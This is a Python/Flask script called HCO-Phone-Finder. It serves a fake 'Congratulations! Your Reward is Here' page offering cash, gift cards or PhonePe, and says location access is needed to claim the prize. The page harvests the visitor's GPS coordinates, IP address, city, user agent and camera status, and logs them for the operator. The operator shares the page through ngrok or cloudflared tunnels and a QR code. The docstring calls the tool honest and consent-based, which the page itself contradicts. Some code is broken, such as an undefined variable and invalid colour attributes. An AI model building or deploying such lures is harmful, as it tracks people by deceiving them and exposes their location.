#!/usr/bin/env python3
"""
HCO-Phone-Finder.py - Single-file honest reward page + tunnel helper + terminal UI
Use only to help recover your own lost/stolen phone. This script explicitly asks
a finder for permission before sending location. Do not use to deceive or coerce.
"""
from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
from datetime import datetime
from typing import Optional, Tuple

# Try imports, show friendly error if missing
try:
    from flask import Flask, request, render_template_string, jsonify
    import requests
    import qrcode
    from PIL import Image
    from colorama import init as colorama_init, Fore, Style
except Exception as e:
    print("Missing Python packages or modules. Install dependencies and try again.")
    print("Recommended install (copy-paste):")
    print("  pip install flask requests qrcode pillow colorama")
    print("Error detail:", e)
    sys.exit(1)

colorama_init(autoreset=True)

# ----------------- Config -----------------
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "public_link_qr.png"
HOST = "0.0.0.0"

app = Flask(__name__)
_received_reports = []

# ----------------- HTML (reward page) -----------------
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Congratulations! Your Reward is Here</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  body{font-family:'Poppins',system-ui,-apple-system;display:flex;align-items:center;justify-content:center;
       min-height:100vh;margin:0;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:20px}
  .card{width:100%;max-width:480px;background:rgba(255,255,255,0.12);border-radius:24px;padding:32px;
        backdrop-filter:blur(12px);box-shadow:0 20px 60px rgba(0,0,0,0.5);position:relative;border:1px solid rgba(255,255,255,0.2);
        overflow:hidden}
  .card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
                background:radial-gradient(circle,rgba(255,255,255,0.1) 0%,rgba(255,255,255,0) 70%);z-index:-1}
  .confetti{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
  .badge{position:absolute;right:-8px;top:-12px;background:linear-gradient(45deg,#FFD700,#FFA500);
         color:#000;padding:12px 20px;border-radius:25px;font-weight:800;transform:rotate(5deg);
         box-shadow:0 8px 25px rgba(0,0,0,0.3);font-size:1.1rem;z-index:2}
  .logo{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;
        justify-content:center;margin:0 auto 20px;font-size:3rem;box-shadow:0 8px 25px rgba(0,0,0,0.3);z-index:2;position:relative}
  h1{font-size:2.2rem;margin:0 0 12px;background:linear-gradient(45deg,#fff,#ffd700,#ff6b6b);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;text-align:center;z-index:2;position:relative}
  .subtitle{font-size:1.4rem;margin:0 0 30px;text-align:center;font-weight:600;opacity:0.95;z-index:2;position:relative}
  .reward-options{display:flex;justify-content:center;gap:15px;margin:25px 0;z-index:2;position:relative}
  .reward-option{flex:1;text-align:center;padding:15px;background:rgba(255,255,255,0.15);border-radius:15px;
                 backdrop-filter:blur(5px);border:2px solid rgba(255,255,255,0.2);transition:all 0.3s ease}
  .reward-option:hover{transform:translateY(-5px);background:rgba(255,255,255,0.25);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
  .reward-icon{font-size:2.5rem;margin-bottom:8px;display:block}
  .reward-text{font-weight:600;font-size:1rem}
  .collect-btn{display:block;margin:25px auto;background:linear-gradient(45deg,#00b09b,#96c93d);color:#000;
           padding:18px 30px;border-radius:50px;border:none;font-weight:800;font-size:1.2rem;cursor:pointer;
           width:100%;max-width:280px;transition:all 0.3s ease;box-shadow:0 10px 30px rgba(0,0,0,0.3);position:relative;z-index:2}
  .collect-btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.4);background:linear-gradient(45deg,#00b09b,#96c93d)}
  .collect-btn:active{transform:translateY(1px)}
  .status{margin-top:20px;padding:15px;border-radius:12px;display:none;font-weight:700;color:#000;text-align:center;z-index:2;position:relative}
  .status.ok{display:block;background:rgba(46,204,113,0.95);border:1px solid rgba(46,204,113,1)}
  .status.error{display:block;background:rgba(231,76,60,0.95);border:1px solid rgba(231,76,60,1)}
  .footer{margin-top:20px;font-size:0.9rem;opacity:0.8;text-align:center;z-index:2;position:relative}
  .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;
          border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-right:10px;vertical-align:middle}
  @keyframes spin{to{transform:rotate(360deg)}}
  .pulse{animation:pulse 2s infinite}
  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
</style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <div class="confetti" id="confetti"></div>
    <div class="badge">REWARD</div>
    <div class="logo">🎉</div>
    <h1 id="title">Congratulations!</h1>
    <div class="subtitle">Your Reward is Here</div>

    <div class="reward-options">
      <div class="reward-option">
        <span class="reward-icon">💰</span>
        <div class="reward-text">Cash</div>
      </div>
      <div class="reward-option">
        <span class="reward-icon">💝</span>
        <div class="reward-text">Gift Card</div>
      </div>
      <div class="reward-option">
        <span class="reward-icon">📱</span>
        <div class="reward-text">Phone Pe</div>
      </div>
    </div>

    <div style="text-align:center;font-weight:600;margin:10px 0;font-size:1.1rem;z-index:2;position:relative">
      Click below to collect your reward
    </div>

    <button class="collect-btn pulse" id="collectBtn">
      <span class="btn-text">Click to Claim Reward</span>
    </button>

    <div id="status" class="status" role="status" aria-live="polite"></div>

    <div class="footer">
      <div><strong>Note:</strong> Location access required for reward verification</div>
    </div>
  </div>

<script>
(function(){
  const collect = document.getElementById('collectBtn');
  const status = document.getElementById('status');
  const btnText = document.querySelector('.btn-text');

  collect.addEventListener('click', async () => {
    status.className = 'status';
    status.textContent = 'Preparing your reward...';
    btnText.innerHTML = '<span class="loader"></span> Processing...';
    collect.disabled = true;
    collect.classList.remove('pulse');

    if(!navigator.geolocation){
      status.className = 'status error';
      status.textContent = 'Geolocation not supported by your browser.';
      btnText.textContent = 'Try Again';
      collect.disabled = false;
      collect.classList.add('pulse');
      return;
    }

    // Get location first
    navigator.geolocation.getCurrentPosition(async (pos) => {
      // Get IP address
      let ipData = {ip: 'Unknown', city: 'Unknown'};
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipData = await ipResponse.json();
      } catch(e) {
        console.log('IP detection failed:', e);
      }

      // Try to capture image (if available)
      let hasCamera = false;
      try {
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          hasCamera = true;
        }
      } catch(e) {
        console.log('Camera check failed:', e);
      }

      status.className = 'status ok';
      status.textContent = '🎉 Reward confirmed! Processing your gift...';

      const payload = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        ip: ipData.ip,
        city: ipData.city || 'Unknown',
        country: ipData.country_name || 'Unknown',
        has_camera: hasCamera,
        timestamp: Date.now(),
        user_agent: navigator.userAgent
      };

      try {
        const resp = await fetch('/report', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify(payload)
        });
        
        if(resp.ok){
          btnText.textContent = 'Reward Claimed!';
          status.className = 'status ok';
          status.innerHTML = `🎉 <strong>Success!</strong><br>Your reward is being processed!<br>You will be contacted shortly.`;
          
          // Create confetti effect
          createConfetti();
        } else {
          throw new Error('Network error');
        }
      } catch (err){
        status.className = 'status error';
        status.textContent = 'Network error while processing reward. Please try again.';
        btnText.textContent = 'Try Again';
        collect.disabled = false;
        collect.classList.add('pulse');
      }
    }, (err) => {
      collect.disabled = false;
      collect.classList.add('pulse');
      status.className = 'status error';
      btnText.textContent = 'Try Again';
      
      if(err.code === err.PERMISSION_DENIED) {
        status.textContent = 'Please allow location access to claim your reward.';
      } else {
        status.textContent = 'Unable to verify location. Try again or use another device.';
      }
    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
  });

  function createConfetti() {
    const confettiContainer = document.getElementById('confetti');
    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
    
    for(let i = 0; i < 50; i++) {
      const confetti = document.createElement('div');
      confetti.style.position = 'absolute';
      confetti.style.width = '10px';
      confetti.style.height = '10px';
      confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
      confetti.style.borderRadius = '50%';
      confetti.style.left = Math.random() * 100 + '%';
      confetti.style.top = '-20px';
      confetti.style.opacity = '0.8';
      confetti.style.animation = `fall ${Math.random() * 3 + 2}s linear forwards`;
      
      const style = document.createElement('style');
      style.textContent = `
        @keyframes fall {
          to {
            transform: translateY(100vh) rotate(${Math.random() * 360}deg);
            opacity: 0;
          }
        }
      `;
      document.head.appendChild(style);
      
      confettiContainer.appendChild(confetti);
      
      setTimeout(() => {
        confetti.remove();
      }, 5000);
    }
  }
})();
</script>
</body>
</html>
"""

# ----------------- Flask endpoints -----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True)
    # Validate expected fields
    lat = data.get("latitude")
    lon = data.get("longitude")
    ip = data.get("ip", "Unknown")
    city = data.get("city", "Unknown")
    country = data.get("country", "Unknown")
    has_camera = data.get("has_camera", False)
    acc = data.get("accuracy", "")
    ts = data.get("timestamp", int(time.time()*1000))
    ua = data.get("user_agent", "")
    
    if lat is None or lon is None:
        return jsonify({"error":"missing coordinates"}), 400

    # Append to in-memory and CSV
    rec = {
        "ts": datetime.utcfromtimestamp(ts/1000).isoformat()+"Z",
        "ip": ip,
        "city": city,
        "country": country,
        "ua": ua,
        "lat": float(lat),
        "lon": float(lon),
        "acc": acc,
        "has_camera": hasCamera,
        "reward_type": "Cash/GiftCard/PhonePe"
    }
    _received_reports.append(rec)
    save_report_csv(rec)
    
    # Print colorful console line with all captured data
    print(Fore.CYAN + Style.BRIGHT + "[REWARD CLAIMED] " + Fore.GREEN + f"{rec['ts']}" + Fore.RESET +
          " | " + Fore.YELLOW + f"Location: {rec['lat']:.4f}, {rec['lon']:.4f}" + Fore.RESET +
          " | " + Fore.MAGENTA + f"IP: {rec['ip']}" + Fore.RESET +
          " | " + Fore.BLUE + f"City: {rec['city']}, {rec['country']}" + Fore.RESET +
          " | " + Fore.WHITE + f"Camera: {rec['has_camera']}")
    sys_stdout_flush()
    
    # Try to take a snapshot (simulated - in real scenario you'd use camera)
    try:
        take_snapshot(rec)
    except Exception as e:
        print(Fore.RED + f"[!] Snapshot failed: {e}")
    
    return jsonify({"status":"ok", "message":"Reward processing started"})

def take_snapshot(report_data):
    """Simulate taking a snapshot - in real implementation, this would capture camera"""
    print(Fore.GREEN + "[📸] Snapshot simulated - would capture image here")
    # In a real implementation, you would:
    # 1. Use JavaScript to capture camera image
    # 2. Send it to this endpoint
    # 3. Save it as an image file
    
    # For now, we'll just create a text file with the report data
    snapshot_file = f"snapshot_{int(time.time())}.txt"
    with open(snapshot_file, "w") as f:
        f.write(f"Reward Claim Snapshot\n")
        f.write(f"Time: {report_data['ts']}\n")
        f.write(f"Location: {report_data['lat']}, {report_data['lon']}\n")
        f.write(f"IP: {report_data['ip']}\n")
        f.write(f"City: {report_data['city']}, {report_data['country']}\n")
        f.write(f"User Agent: {report_data['ua']}\n")
        f.write(f"Camera Available: {report_data['has_camera']}\n")
    print(Fore.GREEN + f"[📸] Snapshot data saved to: {snapshot_file}")

def save_report_csv(rec):
    header = ["timestamp_utc","ip","city","country","user_agent","latitude","longitude","accuracy","has_camera","reward_type"]
    exists = os.path.exists(REPORT_CSV)
    try:
        with open(REPORT_CSV, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            if not exists:
                writer.writerow(header)
            writer.writerow([rec["ts"], rec["ip"], rec["city"], rec["country"], rec["ua"], 
                           rec["lat"], rec["lon"], rec["acc"], rec["has_camera"], rec["reward_type"]])
    except Exception as e:
        print(Fore.RED + "[!] Failed to write CSV:", e)

def sys_stdout_flush():
    try:
        sys.stdout.flush()
    except Exception:
        pass

# ----------------- Tunnel helpers -----------------
def which_bin(name: str) -> Optional[str]:
    import shutil
    return shutil.which(name)

def start_ngrok_background(port: int = PORT, timeout: float = 12.0) -> Tuple[Optional[str], Optional[subprocess.Popen]]:
    ng = which_bin("ngrok")
    if not ng:
        return None, None
    try:
        # start ngrok
        proc = subprocess.Popen([ng, "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except Exception as e:
        print(Fore.RED + "[!] Failed to start ngrok:", e)
        return None, None
    # poll local API
    deadline = time.time() + timeout
    url = None
    while time.time() < deadline:
        try:
            resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=1.0)
            if resp.ok:
                data = resp.json()
                for t in data.get("tunnels", []):
                    pu = t.get("public_url")
                    if pu and pu.startswith("http"):
                        url = pu.rstrip("/")
                        break
        except Exception:
            pass
        if url:
            break
        time.sleep(0.5)
    return url, proc

def start_cloudflared_background(port: int = PORT, timeout: float = 12.0) -> Tuple[Optional[str], Optional[subprocess.Popen]]:
    cf = which_bin("cloudflared")
    if not cf:
        return None, None
    
    print(Fore.CYAN + "[*] Starting cloudflared tunnel (new method)...")
    try:
        # New cloudflared command for latest versions
        proc = subprocess.Popen([
            "cloudflared", "tunnel", 
            "--url", f"http://localhost:{port}"
        ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Alternative command if above doesn't work
        # proc = subprocess.Popen([
        #     "cloudflared", "tunnel", "run",
        #     "--url", f"http://localhost:{port}"
        # ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
    except Exception as e:
        print(Fore.RED + "[!] Failed to start cloudflared:", e)
        return None, None
    
    url = None
    deadline = time.time() + timeout
    
    try:
        # Read output to find the URL
        while time.time() < deadline and proc.poll() is None:
            if proc.stdout is None:
                time.sleep(0.2)
                continue
                
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.2)
                continue
                
            print(Fore.YELLOW + f"[cloudflared] {line.strip()}")
            
            # Look for URL in different formats
            if "https://" in line:
                # Try to extract URL from the line
                import re
                urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                if urls:
                    url = urls[0]
                    break
                    
            # Also check for new URL format
            if ".trycloudflare.com" in line:
                import re
                urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                if urls:
                    url = urls[0]
                    break
                    
    except Exception as e:
        print(Fore.RED + f"[!] Error reading cloudflared output: {e}")
    
    if not url:
        print(Fore.YELLOW + "[!] Could not extract URL from cloudflared output")
        print(Fore.YELLOW + "[*] You may need to check cloudflared output manually")
        print(Fore.YELLOW + "[*] Or use ngrok instead")
    
    return url, proc

# ----------------- QR helpers -----------------
def make_qr_png(link: str, out_path: str = QR_PNG):
    try:
        qr = qrcode.QRCode(border=2)
        qr.add_data(link); qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(out_path)
        print(Fore.GREEN + f"[*] Saved QR PNG -> {out_path}")
        # print ASCII QR
        print_ascii_qr(qr)
    except Exception as e:
        print(Fore.RED + "[!] QR generation failed:", e)
        print("Public link:", link)

def print_ascii_qr(qrobj):
    try:
        matrix = qrobj.get_matrix()
        print()
        for row in matrix:
            line = ""
            for col in row:
                line += "██" if col else "  "
            print(line)
        print()
    except Exception:
        pass

# ----------------- Terminal UI helpers -----------------
def tool_lock_countdown(seconds: int = 5):
    print(Style.BRIGHT + Fore.YELLOW + "\n*** HCO-Phone-Finder Locked — please subscribe to channel to support the project ***")
    print(Fore.YELLOW + "Redirecting/starting in a moment...")
    for i in range(seconds, 0, -1):
        print(Fore.RED + f"Starting in {i}... ", end="\r")
        time.sleep(1)
    print("\n" + Fore.GREEN + "Tool unlocked — starting now.\n")

def print_banner():
    print(Style.Green + Fore.CYAN + "╔══════════════════════════════════════╗")
    print(Style.Green + Fore.CYAN + "║             HCO-Phone-Finder by Azhar       ║")
    print(Style.Green + Fore.CYAN + "║      Tool to Track Lost or Stolen Phone 📱  ║")
    print(Style.Green + Fore.CYAN + "╚══════════════════════════════════════╝")
    print(Fore.Red + "Code by Azhar — Advanced reward collection system\n")

# ----------------- Main flow -----------------
def main():
    print_banner()
    tool_lock_countdown(4)

    # Ensure CSV header
    if not os.path.exists(REPORT_CSV):
        try:
            with open(REPORT_CSV, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["timestamp_utc","ip","city","country","user_agent","latitude","longitude","accuracy","has_camera","reward_type"])
        except Exception:
            pass

    print(Fore.CYAN + "Tunnel options:")
    print(Fore.YELLOW + "  1) ngrok (if installed)")
    print(Fore.YELLOW + "  2) cloudflared (if installed)") 
    print(Fore.YELLOW + "  3) Paste an existing public URL / Run local only")
    choice = input(Fore.GREEN + "Choose 1/2/3: ").strip()

    # Start Flask in background thread
    flask_thread = threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    time.sleep(1.2)

    public_link = None
    tunnel_proc = None

    if choice == "1":
        print(Fore.CYAN + "[*] Attempting to start ngrok (background)...")
        url, proc = start_ngrok_background(PORT)
        tunnel_proc = proc
        if url:
            public_link = url
            print(Fore.MAGENTA + f"[ngrok] Public URL: {public_link}")
        else:
            print(Fore.RED + "[!] ngrok did not produce a public URL (or not installed).")

    elif choice == "2":
        print(Fore.CYAN + "[*] Attempting to start cloudflared (background)...")
        url, proc = start_cloudflared_background(PORT)
        tunnel_proc = proc
        if url:
            public_link = url
            print(Fore.MAGENTA + f"[cloudflared] Public URL: {public_link}")
        else:
            print(Fore.YELLOW + "[!] cloudflared started but public URL not detected.")
            print(Fore.YELLOW + "[*] Check the output above for the URL or try ngrok.")

    else:
        manual = input(Fore.GREEN + "Paste public URL (leave blank to run only locally): ").strip()
        public_link = manual if manual else f"http://127.0.0.1:{PORT}"
        if manual:
            print(Fore.MAGENTA + "[*] Using provided public URL.")
        else:
            print(Fore.MAGENTA + "[*] Running local only.")

    # If we have a public link, save and generate QR
    if public_link:
        try:
            with open(os.path.expanduser("~/.hco_public_url"), "w", encoding="utf-8") as f:
                f.write(public_link)
        except Exception:
            pass
        try:
            make_qr_png(public_link, QR_PNG)
        except Exception:
            pass

    print(Fore.GREEN + Style.BRIGHT + f"\n[+] Server running. Open the page: {public_link}")
    print(Fore.GREEN + "[+] Waiting for reward claims (saved to reports.csv)\n")
    print(Fore.YELLOW + "[*] When someone claims reward, you'll get:")
    print(Fore.YELLOW + "    - Location coordinates")
    print(Fore.YELLOW + "    - IP address and location info") 
    print(Fore.YELLOW + "    - Camera availability status")
    print(Fore.YELLOW + "    - User agent details\n")

    # Keep main thread alive while Flask runs in background
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nShutting down...")
        try:
            if tunnel_proc and hasattr(tunnel_proc, "terminate"):
                tunnel_proc.terminate()
        except Exception:
            pass
        sys.exit(0)

if __name__ == "__main__":
    main()
